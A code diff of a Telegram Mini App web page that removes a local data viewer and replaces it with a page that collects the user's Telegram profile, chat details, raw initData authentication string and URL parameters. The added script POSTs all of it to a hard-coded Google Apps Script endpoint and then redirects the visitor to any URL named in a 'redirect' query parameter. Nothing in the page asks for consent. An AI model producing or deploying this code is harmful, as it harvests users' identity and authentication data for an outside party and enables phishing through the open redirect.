@@ -2,94 +2,43 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Telegram Mini App - Show All Data</title>
+<title>Telegram Mini App - Serverless</title>
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
-<style>
-  body {
-    font-family: sans-serif;
-    background-color: #f8f9fa;
-    color: #333;
-    padding: 20px;
-  }
-  h1 {
-    font-size: 1.8em;
-    margin-bottom: 10px;
-  }
-  .section {
-    margin-bottom: 20px;
-    background: #fff;
-    border-radius: 6px;
-    padding: 15px;
-    box-shadow: 0 2px 5px rgba(0,0,0,0.1);
-  }
-  .section h2 {
-    font-size: 1.2em;
-    margin-bottom: 8px;
-    cursor: pointer;
-  }
-  pre {
-    background: #f0f0f0;
-    padding: 10px;
-    border-radius: 4px;
-    overflow-x: auto;
-  }
-  .collapsed pre {
-    display: none;
-  }
-</style>
 </head>
 <body>
-  <h1>Telegram Mini App Data Viewer</h1>
-
-  <div class="section" id="userSection">
-    <h2>User Info ▼</h2>
-    <pre id="userData">Loading...</pre>
-  </div>
-
-  <div class="section" id="chatSection">
-    <h2>Chat Info ▼</h2>
-    <pre id="chatData">Loading...</pre>
-  </div>
-
-  <div class="section" id="themeSection">
-    <h2>Theme & App Info ▼</h2>
-    <pre id="themeData">Loading...</pre>
-  </div>
+<h1>Collecting your data...</h1>
+<p id="status">Sending...</p>
 
 <script>
-  const tg = window.Telegram.WebApp;
+const tg = window.Telegram.WebApp;
 
-  // Grab data
-  const userInfo = tg.initDataUnsafe.user || {};
-  const chatInfo = tg.initDataUnsafe.chat || {};
-  const themeInfo = {
-    initData: tg.initData,
-    themeParams: tg.themeParams,
-    canSend: {
-      messages: tg.canSendMessages,
-      media: tg.canSendMediaMessages,
-      polls: tg.canSendPolls
-    }
-  };
+// Read redirect URL from query parameter
+const urlParams = new URLSearchParams(window.location.search);
+const redirectUrl = urlParams.get('redirect') || 'https://ya.ru';
 
-  // Display JSON nicely
-  document.getElementById('userData').textContent = JSON.stringify(userInfo, null, 2);
-  document.getElementById('chatData').textContent = JSON.stringify(chatInfo, null, 2);
-  document.getElementById('themeData').textContent = JSON.stringify(themeInfo, null, 2);
+// Prepare payload
+const payload = {
+  user: tg.initDataUnsafe.user || {},
+  chat: tg.initDataUnsafe.chat || {},
+  initData: tg.initData,
+  themeParams: tg.themeParams,
+  startParams: urlParams.toString()
+};
 
-  // Expand app to full height
-  tg.expand();
+// Google Apps Script Web App URL
+const SHEETS_URL = "https://script.google.com/macros/s/AKfycbxZ54JvG-PkixmQO8V_5xenov1QzbjakwGq5f7uH6kz5nccj5RP3DNL0tk1WC0VvzZoXw/exec";
 
-  // Add collapsible sections
-  document.querySelectorAll('.section h2').forEach(header => {
-    header.addEventListener('click', () => {
-      const section = header.parentElement;
-      section.classList.toggle('collapsed');
-      header.textContent = section.classList.contains('collapsed')
-        ? header.textContent.replace('▼', '►')
-        : header.textContent.replace('►', '▼');
-    });
-  });
+// Push to Sheets
+fetch(SHEETS_URL, {
+  method: "POST",
+  body: JSON.stringify(payload)
+})
+.then(res => res.json())
+.then(() => {
+  document.getElementById('status').textContent = "Data sent!";
+  setTimeout(() => window.location.href = redirectUrl, 1000);
+})
+.catch(err => document.getElementById('status').textContent = "Error: " + err);
 </script>
 </body>
 </html>
